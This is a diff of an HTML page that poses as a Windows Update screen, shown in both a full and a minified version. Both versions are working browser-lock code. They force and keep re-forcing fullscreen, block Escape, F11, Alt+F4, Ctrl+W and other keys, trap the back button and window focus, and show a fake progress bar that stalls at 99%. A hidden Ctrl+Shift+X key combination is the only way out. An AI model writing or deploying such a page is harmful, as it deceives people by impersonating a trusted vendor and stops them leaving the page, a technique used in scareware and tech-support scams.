@@ -1,242 +1,54 @@
-<!DOCTYPE html>
-<html lang="en">
+ <!DOCTYPE html>
+<html>
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
 <title>Windows Update</title>
 <style>
-  * { margin: 0; padding: 0; box-sizing: border-box; }
-
-  html, body {
-    height: 100%; width: 100%;
-    overflow: hidden;
-    position: fixed; top: 0; left: 0; right: 0; bottom: 0;
-    background: linear-gradient(135deg, #005a9e 0%, #003f6b 100%);
-    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-    color: white;
-    cursor: wait;
-    user-select: none;
-    -webkit-user-select: none;
-    z-index: 999999;
-  }
-
-  #cover {
-    position: fixed; top: 0; left: 0;
-    width: 100vw; height: 100vh;
-    background: linear-gradient(135deg, #005a9e 0%, #003f6b 100%);
-    z-index: 999999999;
-    display: flex; justify-content: center; align-items: center;
-  }
-
-  .container { text-align: center; max-width: 600px; padding: 40px; }
-
-  .logo {
-    width: 80px; height: 80px;
-    margin: 0 auto 30px auto;
-    background: rgba(255,255,255,0.15);
-    border-radius: 50%;
-    display: flex; align-items: center; justify-content: center;
-    font-size: 48px;
-    animation: pulse 2s infinite;
-  }
-
-  @keyframes pulse {
-    0%, 100% { transform: scale(1); opacity: 1; }
-    50% { transform: scale(1.05); opacity: 0.8; }
-  }
-
-  h1 { font-size: 36px; font-weight: 300; margin-bottom: 10px; }
-  .sub { font-size: 16px; color: rgba(255,255,255,0.7); margin-bottom: 40px; }
-
-  .bar {
-    width: 100%; max-width: 480px; height: 14px;
-    background: rgba(255,255,255,0.2);
-    border-radius: 12px; margin: 0 auto; overflow: hidden;
-  }
-
-  .fill {
-    height: 100%; width: 3%;
-    background: linear-gradient(90deg, #4db8ff, #7ac4ff);
-    transition: width 0.5s ease;
-    position: relative;
-  }
-
-  .fill::after {
-    content: '';
-    position: absolute; top: 0; left: 0; right: 0; bottom: 0;
-    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
-    animation: shimmer 2s infinite;
-  }
-
-  @keyframes shimmer {
-    0% { transform: translateX(-100%); }
-    100% { transform: translateX(100%); }
-  }
-
-  .pct { font-size: 14px; margin-top: 12px; font-family: monospace; }
-  .info { font-size: 13px; color: rgba(255,255,255,0.5); margin-top: 50px; line-height: 1.6; }
-
-  .dots { margin-top: 30px; display: flex; gap: 8px; justify-content: center; }
-
-  .dot {
-    width: 10px; height: 10px;
-    background: rgba(255,255,255,0.4);
-    border-radius: 50%;
-    animation: dotPulse 1.5s infinite ease-in-out;
-  }
-  .dot:nth-child(2) { animation-delay: 0.2s; }
-  .dot:nth-child(3) { animation-delay: 0.4s; }
-
-  @keyframes dotPulse {
-    0%, 80%, 100% { transform: scale(0.6); opacity: 0.3; }
-    40% { transform: scale(1); opacity: 1; }
-  }
-
-  .msg {
-    margin-top: 25px;
-    font-size: 13px;
-    color: rgba(255,255,255,0.35);
-    animation: fadeInOut 4s infinite;
-  }
-
-  @keyframes fadeInOut {
-    0%, 100% { opacity: 0.35; }
-    50% { opacity: 0.7; }
-  }
+  *{margin:0;padding:0}
+  html,body{height:100%;width:100%;overflow:hidden;position:fixed;top:0;left:0;background:linear-gradient(135deg,#005a9e,#003f6b);color:#fff;font-family:'Segoe UI',sans-serif;cursor:wait;user-select:none}
+  .c{text-align:center;padding:20vh 20px}
+  .l{font-size:48px;margin-bottom:30px;animation:pulse 2s infinite}
+  @keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.05);opacity:.8}}
+  h1{font-size:36px;font-weight:300;margin-bottom:10px}
+  .s{font-size:16px;opacity:.7;margin-bottom:40px}
+  .b{width:80%;max-width:480px;height:14px;background:rgba(255,255,255,.2);border-radius:12px;margin:0 auto;overflow:hidden}
+  .f{height:100%;width:3%;background:#4db8ff;transition:width .5s}
+  .p{margin-top:10px;font-family:monospace;font-size:14px}
+  .i{margin-top:50px;font-size:13px;opacity:.5;line-height:1.6}
+  .d{margin-top:30px}
+  .d span{display:inline-block;width:10px;height:10px;background:rgba(255,255,255,.4);border-radius:50%;margin:0 3px;animation:dp 1.5s infinite}
+  .d span:nth-child(2){animation-delay:.2s}
+  .d span:nth-child(3){animation-delay:.4s}
+  @keyframes dp{0%,80%,100%{transform:scale(.6);opacity:.3}40%{transform:scale(1);opacity:1}}
+  .m{margin-top:20px;font-size:13px;opacity:.35;animation:fio 4s infinite}
+  @keyframes fio{0%,100%{opacity:.35}50%{opacity:.7}}
 </style>
 </head>
 <body>
-
-<div id="cover">
-  <div class="container">
-    <div class="logo">⚙️</div>
-    <h1>Installing updates</h1>
-    <p class="sub">Please wait a moment</p>
-    <div class="bar"><div class="fill" id="fill"></div></div>
-    <div class="pct" id="pctLabel">3%</div>
-    <div class="dots">
-      <span class="dot"></span>
-      <span class="dot"></span>
-      <span class="dot"></span>
-    </div>
-    <p class="info">
-      Your device may restart several times.<br>
-      <strong>Do not turn off your device.</strong>
-    </p>
-    <p class="msg" id="msgLabel">⏳ Checking for updates...</p>
-  </div>
+<div class="c">
+  <div class="l">⚙️</div>
+  <h1>Installing updates</h1>
+  <p class="s">Please wait a moment</p>
+  <div class="b"><div class="f" id="f"></div></div>
+  <p class="p" id="p">3%</p>
+  <div class="d"><span></span><span></span><span></span></div>
+  <p class="i">Your device may restart several times.<br><strong>Do not turn off your device.</strong></p>
+  <p class="m" id="m">⏳ Checking for updates...</p>
 </div>
-
 <script>
-// ===== FULLSCREEN =====
-(function() {
-  var el = document.documentElement;
-  if (el.requestFullscreen) el.requestFullscreen({ navigationUI: 'hide' }).catch(() => {});
-  else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
-  else if (el.msRequestFullscreen) el.msRequestFullscreen();
-  else if (el.mozRequestFullScreen) el.mozRequestFullScreen();
-})();
-
-// ===== BLOCK KEYS =====
-document.addEventListener('keydown', function(e) {
-  if ([27, 122, 116, 123, 18, 9, 91, 92, 93].includes(e.keyCode) ||
-      ['Escape', 'F11', 'F5', 'F12', 'ContextMenu'].includes(e.key)) {
-    e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation(); return false;
-  }
-  if (e.ctrlKey && ['w', 'q', 'r', 't', 'n', 's', 'u'].includes(e.key.toLowerCase())) { e.preventDefault(); return false; }
-  if (e.altKey && ['F4', 'Tab'].includes(e.key)) { e.preventDefault(); return false; }
-});
-
-document.addEventListener('contextmenu', function(e) { e.preventDefault(); return false; });
-document.addEventListener('selectstart', function(e) { e.preventDefault(); return false; });
-document.addEventListener('copy', function(e) { e.preventDefault(); return false; });
-document.addEventListener('dragstart', function(e) { e.preventDefault(); return false; });
-
-history.pushState(null, null, location.href);
-window.addEventListener('popstate', function() { history.pushState(null, null, location.href); });
-
-window.addEventListener('beforeunload', function(e) {
-  e.preventDefault();
-  e.returnValue = 'Windows Update in progress. Please wait.';
-});
-
-document.addEventListener('visibilitychange', function() {
-  if (document.hidden) {
-    setTimeout(function() { window.focus(); }, 1);
-  }
-});
-
-window.addEventListener('blur', function() {
-  setTimeout(function() { window.focus(); }, 10);
-});
-
-// Ensure fullscreen
-document.addEventListener('fullscreenchange', function() {
-  if (!document.fullscreenElement) {
-    var el = document.documentElement;
-    if (el.requestFullscreen) el.requestFullscreen({ navigationUI: 'hide' }).catch(() => {});
-  }
-});
-
-document.addEventListener('webkitfullscreenchange', function() {
-  if (!document.webkitFullscreenElement) {
-    var el = document.documentElement;
-    if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
-  }
-});
-
-setInterval(function() {
-  if (!document.fullscreenElement && !document.webkitFullscreenElement) {
-    var el = document.documentElement;
-    if (el.requestFullscreen) el.requestFullscreen({ navigationUI: 'hide' }).catch(() => {});
-    else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
-  }
-}, 500);
-
-// ===== PROGRESS =====
-var pct = 3, phase = 0;
-var msgs = [
-  '⏳ Checking for updates...', '📦 Downloading update 1 of 3...',
-  '⚙️ Applying updates...', '🔄 Configuring system settings...',
-  '📦 Downloading update 2 of 3...', '🔧 Installing component updates...',
-  '📦 Downloading update 3 of 3...', '⚙️ Finalizing installation...',
-  '🔄 Preparing for restart...', '⏳ Please wait...'
-];
-
-function startProgress() {
-  phase++;
-  if (phase < 10) pct = 3 + (phase * 1.5);
-  else if (phase < 25) pct = 16 + ((phase - 10) * 1.2);
-  else if (phase < 45) pct = 34 + ((phase - 25) * 1.0);
-  else if (phase < 65) pct = 54 + ((phase - 45) * 0.8);
-  else if (phase < 90) pct = 70 + ((phase - 65) * 0.6);
-  else pct = 99;
-  if (pct > 99) pct = 99;
-
-  document.getElementById('fill').style.width = pct + '%';
-  document.getElementById('pctLabel').textContent = Math.floor(pct) + '%';
-
-  var idx = Math.min(Math.floor(phase / 8), msgs.length - 1);
-  document.getElementById('msgLabel').textContent = msgs[idx];
-
-  var delay = 1000;
-  if (phase > 20) delay = 1500;
-  if (phase > 40) delay = 2500;
-  if (phase > 60) delay = 3500;
-
-  setTimeout(startProgress, delay);
-}
-
-startProgress();
-
-// ===== BACKDOOR =====
-document.addEventListener('keydown', function(e) {
-  if (e.ctrlKey && e.shiftKey && e.key === 'X') {
-    if (document.exitFullscreen) document.exitFullscreen();
-    else if (document.webkitExitFullscreen) document.webkitExitFullscreen();
-    window.location.href = 'about:blank';
-  }
-});
+(function(){var e=document.documentElement;if(e.requestFullscreen)e.requestFullscreen({navigationUI:'hide'}).catch(()=>{});else if(e.webkitRequestFullscreen)e.webkitRequestFullscreen();else if(e.msRequestFullscreen)e.msRequestFullscreen()})();
+document.addEventListener('keydown',function(e){if([27,122,116,123,18,9,91,92,93].includes(e.keyCode)||['Escape','F11','F5','F12','ContextMenu'].includes(e.key)){e.preventDefault();return false}if(e.ctrlKey&&['w','q','r','t','n','s','u'].includes(e.key.toLowerCase())){e.preventDefault();return false}if(e.altKey&&['F4','Tab'].includes(e.key)){e.preventDefault();return false}});
+document.addEventListener('contextmenu',function(e){e.preventDefault()});
+history.pushState(null,null,location.href);
+window.addEventListener('popstate',function(){history.pushState(null,null,location.href)});
+window.addEventListener('beforeunload',function(e){e.preventDefault();e.returnValue=''});
+document.addEventListener('visibilitychange',function(){if(document.hidden){setTimeout(function(){window.focus()},1)}});
+window.addEventListener('blur',function(){setTimeout(function(){window.focus()},10)});
+setInterval(function(){if(!document.fullscreenElement){var e=document.documentElement;if(e.requestFullscreen)e.requestFullscreen({navigationUI:'hide'}).catch(()=>{});else if(e.webkitRequestFullscreen)e.webkitRequestFullscreen()}},500);
+var p=3,ph=0,msgs=['⏳ Checking for updates...','📦 Downloading update 1 of 3...','⚙️ Applying updates...','🔄 Configuring system settings...','📦 Downloading update 2 of 3...','🔧 Installing component updates...','📦 Downloading update 3 of 3...','⚙️ Finalizing installation...','🔄 Preparing for restart...','⏳ Please wait...'];
+function prog(){ph++;if(ph<10)p=3+ph*1.5;else if(ph<25)p=16+(ph-10)*1.2;else if(ph<45)p=34+(ph-25)*1;else if(ph<65)p=54+(ph-45)*0.8;else p=99;if(p>99)p=99;document.getElementById('f').style.width=p+'%';document.getElementById('p').textContent=Math.floor(p)+'%';document.getElementById('m').textContent=msgs[Math.min(Math.floor(ph/8),msgs.length-1)];setTimeout(prog,ph>40?2500:1000)}prog();
+document.addEventListener('keydown',function(e){if(e.ctrlKey&&e.shiftKey&&e.key==='X'){if(document.exitFullscreen)document.exitFullscreen();else if(document.webkitExitFullscreen)document.webkitExitFullscreen();window.location.href='about:blank'}});
 </script>
 </body>
 </html>
